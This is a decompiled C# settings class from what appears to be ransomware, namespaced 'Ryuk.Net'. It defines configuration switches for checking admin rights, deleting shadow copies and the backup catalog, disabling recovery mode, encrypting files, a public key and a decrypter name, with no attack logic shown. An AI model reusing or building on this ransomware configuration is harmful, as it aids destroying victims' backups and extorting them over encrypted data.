using System.CodeDom.Compiler;
using System.Configuration;
using System.Diagnostics;
using System.Runtime.CompilerServices;

namespace Ryuk.Net.Properties;

[CompilerGenerated]
[GeneratedCode("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "11.0.0.0")]
internal sealed class Settings : ApplicationSettingsBase
{
	private static Settings defaultInstance = (Settings)(object)SettingsBase.Synchronized((SettingsBase)(object)new Settings());

	public static Settings Default => defaultInstance;

	[DefaultSettingValue("False")]
	[DebuggerNonUserCode]
	[UserScopedSetting]
	public bool checkAdminPrivilage
	{
		get
		{
			return (bool)((SettingsBase)this).get_Item("checkAdminPrivilage");
		}
		set
		{
			((SettingsBase)this).set_Item("checkAdminPrivilage", (object)value);
		}
	}

	[DefaultSettingValue("False")]
	[UserScopedSetting]
	[DebuggerNonUserCode]
	public bool deleteShadowCopies
	{
		get
		{
			return (bool)((SettingsBase)this).get_Item("deleteShadowCopies");
		}
		set
		{
			((SettingsBase)this).set_Item("deleteShadowCopies", (object)value);
		}
	}

	[DefaultSettingValue("False")]
	[DebuggerNonUserCode]
	[UserScopedSetting]
	public bool disableRecoveryMode
	{
		get
		{
			return (bool)((SettingsBase)this).get_Item("disableRecoveryMode");
		}
		set
		{
			((SettingsBase)this).set_Item("disableRecoveryMode", (object)value);
		}
	}

	[DefaultSettingValue("False")]
	[DebuggerNonUserCode]
	[UserScopedSetting]
	public bool deleteBackupCatalog
	{
		get
		{
			return (bool)((SettingsBase)this).get_Item("deleteBackupCatalog");
		}
		set
		{
			((SettingsBase)this).set_Item("deleteBackupCatalog", (object)value);
		}
	}

	[DebuggerNonUserCode]
	[UserScopedSetting]
	[DefaultSettingValue("False")]
	public bool encryptOption
	{
		get
		{
			return (bool)((SettingsBase)this).get_Item("encryptOption");
		}
		set
		{
			((SettingsBase)this).set_Item("encryptOption", (object)value);
		}
	}

	[DefaultSettingValue("")]
	[UserScopedSetting]
	[DebuggerNonUserCode]
	public string publicKey
	{
		get
		{
			return (string)((SettingsBase)this).get_Item("publicKey");
		}
		set
		{
			((SettingsBase)this).set_Item("publicKey", (object)value);
		}
	}

	[DefaultSettingValue("")]
	[DebuggerNonUserCode]
	[UserScopedSetting]
	public string decrypterName
	{
		get
		{
			return (string)((SettingsBase)this).get_Item("decrypterName");
		}
		set
		{
			((SettingsBase)this).set_Item("decrypterName", (object)value);
		}
	}
}
